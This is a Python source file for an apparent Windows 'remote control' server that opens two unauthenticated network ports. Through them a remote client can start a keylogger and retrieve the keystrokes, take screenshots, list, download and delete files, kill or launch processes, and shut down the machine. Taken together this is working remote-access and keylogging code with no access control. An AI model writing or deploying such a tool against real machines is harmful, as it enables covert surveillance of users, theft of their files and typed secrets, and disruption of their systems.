from pickle import FALSE
import socket
import subprocess
import os
import json
import threading
from winreg import *
from pynput import keyboard
from pynput.keyboard import Listener, Key
from PIL import ImageGrab
from datetime import datetime
import logging
from typing import Optional
import platform
import time
from collections import deque
import signal

class RemoteControlServer:
    def __init__(self, host: str = '', port: int = 8080):
        self.HOST = host
        self.PORT = port
        self.keylog = "" 
        self.unhook = True
        self.running = True
        self.listener = None
        self.main_socket = None
        self.basic_socket = None
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filename='remote_control.log'
        )
            
    def send_formatted_response(self, conn: socket.socket, status: str, data: any = None):
        """Send formatted response for process/app features"""
        try:
            response = {
                "status": status,
                "data": data
            }
            response_str = json.dumps(response) + "\n"
            conn.sendall(response_str.encode('utf-8'))
        except Exception as e:
            logging.error(f"Error sending response: {str(e)}")
            error_response = json.dumps({
                "status": "error",
                "data": str(e)
            }) + "\n"
            conn.sendall(error_response.encode('utf-8'))

    def list_process(self):
        try:
            jsend = {"process": []}
            output = os.popen('wmic process get description, processid, threadcount').read()
            lines = [line.strip() for line in output.splitlines() if line.strip()]
            
            if len(lines) > 1:
                lines = lines[1:]  # Skip header
                
            for line in lines:
                try:
                    parts = [part for part in line.split() if part]
                    if len(parts) >= 3:
                        tc = parts[-1]
                        pid = parts[-2]
                        name = ' '.join(parts[:-2])
                        
                        jsend["process"].append({
                            "name": name,
                            "PID": pid,
                            "TC": tc
                        })
                except Exception as e:
                    logging.error(f"Error processing line '{line}': {str(e)}")
                    continue
                    
            return jsend  # Return dict instead of JSON string
        except Exception as e:
            logging.error(f"Error in list_process: {str(e)}")
            return {"process": []}

    def list_apps(self):
        try:
            jsend = {"app": []}
            # Optimized PowerShell command - only get necessary properties and format as CSV for faster parsing
            cmd = '''powershell "Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName, Id, @{Name='ThreadCount';Expression={$_.Threads.Count}} | ConvertTo-Csv -NoTypeInformation"'''
            
            # Use timeout for process
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate(timeout=5)  # 5 second timeout
            
            if error:
                logging.error(f"PowerShell error: {error.decode()}")
                return {"app": []}

            # Skip header row and process CSV output
            lines = output.decode().splitlines()[1:]  # Skip header
            for line in lines:
                try:
                    # CSV format ensures proper splitting even with spaces in names
                    parts = line.strip('"').split('","')
                    if len(parts) >= 3:
                        jsend["app"].append({
                            "name": parts[0],
                            "ID": parts[1],
                            "TC": parts[2]
                        })
                except Exception as e:
                    logging.error(f"Error processing app line: {str(e)}")
                    continue

            return jsend
        except subprocess.TimeoutExpired:
            logging.error("PowerShell command timed out")
            process.kill()  # Ensure process is terminated
            return {"app": []}
        except Exception as e:
            logging.error(f"Error in list_apps: {str(e)}")
            return {"app": []}

    def check_process(self, pid: str) -> bool:
        try:
            # More reliable process check
            cmd = f'''powershell -Command "
                $process = Get-Process -Id {pid} -ErrorAction SilentlyContinue
                if ($process) {{ 'true' }} else {{ 'false' }}
            "'''
            output = subprocess.check_output(cmd, shell=True, universal_newlines=True)
            return output.strip().lower() == 'true'
        except:
            return False

    def handle_process_commands(self, conn: socket.socket, command: str, args: list):
        try:
            if command == "list":
                process_data = self.list_process()
                self.send_formatted_response(conn, "success", process_data)
                
            elif command == "kill" and len(args) > 0:
                pid = args[0]
                try:
                    if platform.system() == "Windows":
                        check_cmd = f'tasklist /FI "PID eq {pid}" /NH'
                        check_output = subprocess.getoutput(check_cmd)
                        
                        if str(pid) in check_output:
                            subprocess.run(['taskkill', '/F', '/PID', str(pid)], 
                                         check=True, 
                                         capture_output=True)
                            time.sleep(0.2)
                            
                            check_output = subprocess.getoutput(check_cmd)
                            if str(pid) not in check_output:
                                self.send_formatted_response(conn, "success", 
                                    "Process terminated successfully")
                                return
                    
                    self.send_formatted_response(conn, "error", 
                        "Process not found or access denied")
                except Exception as e:
                    self.send_formatted_response(conn, "error", str(e))
            elif command == "start" and len(args) > 0:
                process_name = args[0]
                custom_path = r"C:\\"
                found = False
                for root, dirs, files in os.walk(custom_path):
                    if process_name in files:
                        custom_path = os.path.join(root, process_name)
                        found = True
                        break
                if(found):
                    try:
                        subprocess.Popen(custom_path)
                        self.send_formatted_response(conn, "success", "Process started successfully")
                        return
                    except Exception as e:
                        self.send_formatted_response(conn, "error", str(e))
                self.send_formatted_response(conn, "error", f"can not find {process_name} path")
        except Exception as e:
            self.send_formatted_response(conn, "error", str(e))

    def handle_app_commands(self, conn: socket.socket, command: str, args: list):
        try:
            if command == "list":
                app_data = self.list_apps()
                self.send_formatted_response(conn, "success", app_data)
                
            elif command == "kill" and len(args) > 0:
                pid = args[0]
                try:
                    # Fast check for process existence using tasklist
                    check_cmd = f'tasklist /FI "PID eq {pid}" /NH'
                    check_output = subprocess.getoutput(check_cmd)
                    
                    if str(pid) in check_output:
                        # Kill process with timeout
                        try:
                            subprocess.run(['taskkill', '/F', '/PID', str(pid)], 
                                        check=True, 
                                        capture_output=True,
                                        timeout=3)  # 3 second timeout
                            
                            # Quick verification
                            time.sleep(0.1)  # Reduced delay
                            if not self.check_process(pid):
                                self.send_formatted_response(conn, "success", 
                                    "Application terminated successfully")
                                return
                                
                        except subprocess.TimeoutExpired:
                            logging.error(f"Kill operation timed out for PID {pid}")
                            self.send_formatted_response(conn, "error", 
                                "Operation timed out")
                            return
                            
                    self.send_formatted_response(conn, "error", 
                        "Application not found or access denied")
                        
                except Exception as e:
                    self.send_formatted_response(conn, "error", str(e))
            elif command == "start" and len(args) > 0:
                app_name = args[0]
                custom_path = r"C:\\"
                found = False
                for root, dirs, files in os.walk(custom_path):
                    if app_name in files:
                        custom_path = os.path.join(root, app_name)
                        found = True
                        break
                if(found):
                    try:
                        subprocess.Popen(custom_path)
                        self.send_formatted_response(conn, "success", "Appication started successfully")
                        return
                    except Exception as e:
                        self.send_formatted_response(conn, "error", str(e))
                self.send_formatted_response(conn, "error", f"can not find {app_name} path")
        except Exception as e:
            self.send_formatted_response(conn, "error", str(e))

    def handle_keylogger_commands(self, conn: socket.socket, command: str):
        try:
            if command == "unhook":
                self.unhook = True
                if self.listener:
                    self.listener.stop()
                conn.sendall(b"ok")
            elif command == "getkey":
                data = self.keylog if self.keylog else "404"
                conn.sendall(data.encode())
                self.keylog = ""
            elif command == "hook":
                if self.unhook:
                    self.unhook = False
                    self.listener = keyboard.Listener(on_press=self.on_press)
                    self.listener.start()
                    conn.sendall(b'ok')
        except Exception as e:
            logging.error(f"Keylogger command error: {str(e)}")
            conn.sendall(b'404')

    def on_press(self, key):
        if self.unhook:
            return False
        try:
            if hasattr(key, 'char'):
                self.keylog += str(key.char)
            elif key == Key.space:
                self.keylog += ' '
            elif key == Key.enter:
                self.keylog += '\n'
            elif key == Key.tab:
                self.keylog += '\t'
            else:
                self.keylog += f'[{key.name}]'
        except Exception as e:
            logging.error(f"Keylogger error: {str(e)}")

    def handle_file_commands(self, conn: socket.socket, command: str, args: list):
        """Handle file-related commands"""
        try:
            if not args:
                response = json.dumps({
                    "status": "error",
                    "error": "Missing arguments"
                })
            elif command == "list":
                response = self.list_files(args[0])
            elif command == "download":
                self.send_file(conn, args[0])
                return  # send_file handles its own response
            elif command == "delete":
                response = self.delete_file(args[0])
            else:
                response = json.dumps({
                    "status": "error",
                    "error": "Invalid command"
                })
                
            conn.sendall(response.encode('utf-8'))
            
        except Exception as e:
            error_response = json.dumps({
                "status": "error",
                "error": str(e)
            })
            conn.sendall(error_response.encode('utf-8'))

    def list_files(self, path: str) -> str:
        try:
            # Clean and normalize the path
            path = os.path.normpath(path)
            
            # Validate path exists before proceeding
            if not os.path.exists(path):
                return json.dumps({
                    "status": "error",
                    "error": "Path does not exist"
                }, ensure_ascii=False)
                
            if not os.path.isdir(path):
                return json.dumps({
                    "status": "error",
                    "error": "Path is not a directory"
                }, ensure_ascii=False)

            # Test directory access before proceeding
            try:
                os.listdir(path)
            except PermissionError:
                return json.dumps({
                    "status": "error",
                    "error": "Access denied to this directory"
                }, ensure_ascii=False)
            except Exception as e:
                return json.dumps({
                    "status": "error",
                    "error": f"Cannot access directory: {str(e)}"
                }, ensure_ascii=False)
            
            items = []
            with os.scandir(path) as entries:
                for entry in entries:
                    try:
                        stat = entry.stat()
                        size = ""
                        if entry.is_file():
                            size_bytes = stat.st_size
                            for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                                if size_bytes < 1024:
                                    size = f"{size_bytes:.2f} {unit}"
                                    break
                                size_bytes /= 1024
                                    
                        # Clean the filename to prevent JSON encoding issues
                        name = entry.name
                        # Remove or replace problematic characters
                        name = name.replace('\\', '\\\\').replace('"', '\\"')
                        # Ensure the name is valid UTF-8
                        name = name.encode('utf-8', errors='replace').decode('utf-8')
                        
                        items.append({
                            "name": name,
                            "size": size,
                            "type": "File" if entry.is_file() else "Directory",
                            "modified": datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except Exception as e:
                        logging.error(f"Error processing entry {entry.name}: {str(e)}")
                        continue
                        
            # Sort items: directories first, then files
            items.sort(key=lambda x: (x['type'] == 'File', x['name'].lower()))
            
            # Use json.dumps with proper encoding and escaping
            return json.dumps({
                "status": "success",
                "items": items
            }, ensure_ascii=False, default=str)
            
        except Exception as e:
            error_msg = str(e).encode('utf-8', errors='replace').decode('utf-8')
            return json.dumps({
                "status": "error",
                "error": error_msg
            }, ensure_ascii=False)

    def browse_directories(self, start_path: str) -> str:
        try:
            paths = []
            if not os.path.exists(start_path):
                return json.dumps({
                    "status": "error",
                    "error": "Path does not exist"
                })
                
            if start_path == "C:\\":
                import string
                from ctypes import windll
                drives = []
                bitmask = windll.kernel32.GetLogicalDrives()
                for letter in string.ascii_uppercase:
                    if bitmask & 1:
                        drives.append(f"{letter}:\\")
                    bitmask >>= 1
                return json.dumps({
                    "status": "ok",
                    "paths": drives
                })
                
            try:
                for root, dirs, _ in os.walk(start_path):
                    for dir in dirs:
                        full_path = os.path.join(root, dir)
                        if os.path.exists(full_path):  # Check if path still exists
                            paths.append(full_path)
                    if len(paths) > 100:  # Limit to prevent too many entries
                        break
                        
                return json.dumps({
                    "status": "ok",
                    "paths": [start_path] + paths[:100]
                })
            except PermissionError:
                return json.dumps({
                    "status": "error",
                    "error": "Access denied"
                })
                
        except Exception as e:
            logging.error(f"Error in browse_directories: {str(e)}")
            return json.dumps({
                "status": "error",
                "error": str(e)
            })

    def send_file(self, conn: socket.socket, file_path: str):
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    conn.sendall(chunk)
            conn.sendall(b'<<END>>')
        except Exception as e:
            try:
                conn.sendall(b'ERROR:' + str(e).encode())
            except:
                pass

    def delete_file(self, file_path: str) -> str:
        """Delete file or directory and return JSON response"""
        try:
            if not os.path.exists(file_path):
                return json.dumps({
                    "status": "error",
                    "error": "File not found"
                })
                
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                os.rmdir(file_path)
                
            return json.dumps({
                "status": "success",
                "message": "File deleted successfully"
            })
            
        except Exception as e:
            return json.dumps({
                "status": "error",
                "error": str(e)
            })
        
    def capture_screen(self, conn: socket.socket):
        """Handle screenshot capture"""
        try:
            screenshot_path = self.take_screenshot()
            
            # Send the file in chunks
            with open(screenshot_path, 'rb') as f:
                while True:
                    chunk = f.read(32768)  # Larger chunks for better performance
                    if not chunk:
                        break
                    conn.sendall(chunk)
                    
            # Send end marker
            conn.sendall(b'<<END>>')
            
            # Clean up
            os.remove(screenshot_path)
            
        except Exception as e:
            logging.error(f"Screenshot error: {str(e)}")
            try:
                # Send error marker
                conn.sendall(b'ERROR<<END>>')
            except:
                pass
            
    def take_screenshot(self):
        system = platform.system()

        if system == "Darwin":  # macOS
            try:
                import subprocess
                import tempfile
                
                temp_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
                subprocess.run(["screencapture", "-x", temp_path], check=True)
                return temp_path
                
            except Exception as e:
                raise Exception(f"Failed to capture screen on macOS: {str(e)}")
                
        elif system == "Windows":
            try:
                with ImageGrab.grab() as img:
                    temp_path = "screenshot.png"
                    img.save(temp_path)
                    return temp_path
            except Exception as e:
                raise Exception(f"Failed to capture screen on Windows: {str(e)}")
        else:
            raise Exception(f"Screenshot not supported on {system}")

    def main(self):
        """Run server with two sockets"""
        try:
            # Create main socket for process/app features
            self.main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.main_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.main_socket.bind((self.HOST, self.PORT))
            self.main_socket.listen(1)
            
            # Create basic socket for other features
            self.basic_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.basic_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.basic_socket.bind((self.HOST, self.PORT + 1))
            self.basic_socket.listen(1)
            
            logging.info(f"Server started on {self.HOST}:{self.PORT} and {self.PORT + 1}")
            
            while self.running:
                try:
                    # Wait for main connection
                    main_conn, main_addr = self.main_socket.accept()
                    logging.info(f'Main connection from {main_addr}')
                    
                    # Wait for basic connection
                    basic_conn, basic_addr = self.basic_socket.accept()
                    logging.info(f'Basic connection from {basic_addr}')
                    
                    # Handle both connections
                    main_thread = threading.Thread(target=self.handle_connection, 
                                                args=(main_conn, main_addr, True))
                    basic_thread = threading.Thread(target=self.handle_connection, 
                                                args=(basic_conn, basic_addr, False))
                    
                    main_thread.start()
                    basic_thread.start()
                    
                except Exception as e:
                    logging.error(f"Connection error: {str(e)}")
                    if not self.running:
                        break
                        
        except Exception as e:
            logging.error(f"Server error: {str(e)}")
        finally:
            self.cleanup()

    def handle_connection(self, conn: socket.socket, addr: str, is_main: bool):
        """Handle a single connection"""
        connection_type = "Main" if is_main else "Basic"
        logging.info(f"Started {connection_type} connection handler for {addr}")
        
        try:
            while self.running:
                try: 
                    data = conn.recv(1024)
                    if not data:
                        logging.info(f"{connection_type} connection closed by client {addr}")
                        break
                    
                    # Handle ping for basic connection
                    if not is_main and data == b'ping':
                        conn.sendall(b'pong')
                        continue
                        
                    command = data.decode().strip()
                    if command == 'quit':
                        logging.info(f"Received quit command from {addr}")
                        # Send acknowledgment before closing
                        try:
                            if is_main:
                                self.send_formatted_response(conn, "success", "quit")
                            else:
                                conn.sendall(b'ok')
                        except:
                            pass
                        break
                        
                    parts = command.split('//')
                    command = parts[0]
                    
                    if is_main:
                        # Handle process/app commands
                        if command == "process":
                            self.handle_process_commands(conn, parts[1], parts[2:])
                        elif command == "app":
                            self.handle_app_commands(conn, parts[1], parts[2:])
                        else:
                            self.send_formatted_response(conn, "error", "Invalid command")
                    else:
                        # Handle basic commands
                        try:
                            if command == "key":
                                self.handle_keylogger_commands(conn, parts[1])
                            elif command == "files":
                                self.handle_file_commands(conn, parts[1], parts[2:])
                            elif command == "capture":
                                self.capture_screen(conn)
                            elif command == "shutdown":
                                conn.sendall(b'ok')
                                os.system("shutdown /s /t 1")
                            elif command == "reset":
                                os.system("shutdown /r /t 1")
                            else:
                                conn.sendall(b'404')
                        except Exception as e:
                            logging.error(f"Error handling basic command {command}: {str(e)}")
                            conn.sendall(b'404')
                            
                except ConnectionResetError:
                    logging.info(f"Connection reset by {addr}")
                    break
                except ConnectionAbortedError:
                    logging.info(f"Connection aborted by {addr}")
                    break
                except socket.timeout:
                    continue  # Just continue on timeout
                except socket.error as e:
                    logging.error(f"Socket error with {addr}: {str(e)}")
                    break
                except Exception as e:
                    logging.error(f"{connection_type} connection handler error: {str(e)}")
                    try:
                        if is_main:
                            self.send_formatted_response(conn, "error", str(e))
                        else:
                            conn.sendall(b'404')
                    except:
                        logging.error(f"Failed to send error response to {addr}")
                        break  # Break if we can't communicate with the client
                        
        except Exception as e:
            logging.error(f"Fatal error in {connection_type} connection handler: {str(e)}")
        finally:
            # Clean up resources
            try:
                if self.listener and not is_main:
                    self.listener.stop()
                    self.listener = None
            except:
                pass
                
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except:
                pass
                
            try:
                conn.close()
            except:
                pass
                
            logging.info(f"{connection_type} connection from {addr} closed")
                
    def handle_client_disconnect(self, conn: socket.socket, addr: str, connection_type: str):
        """Handle client disconnection gracefully"""
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except:
            pass
        finally:
            conn.close()
            logging.info(f'{connection_type} connection from {addr} closed')

    def shutdown(self):
        """Shutdown the server gracefully"""
        logging.info("Initiating server shutdown...")
        self.running = False
        
        # Create temporary connections
        try:
            temp_socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            temp_socket1.connect((self.HOST or 'localhost', self.PORT))
            temp_socket2.connect((self.HOST or 'localhost', self.PORT + 1))
            
            temp_socket1.close()
            temp_socket2.close()
        except:
            pass
        
        self.cleanup()

    def cleanup(self):
        """Clean up all resources"""
        self.running = False
        
        # Stop keylogger if active
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
            self.listener = None
        
        # Clean up main socket
        if self.main_socket:
            try:
                self.main_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            finally:
                self.main_socket.close()
                self.main_socket = None
        
        # Clean up basic socket
        if self.basic_socket:
            try:
                self.basic_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            finally:
                self.basic_socket.close()
                self.basic_socket = None
                
        logging.info("Server cleanup completed")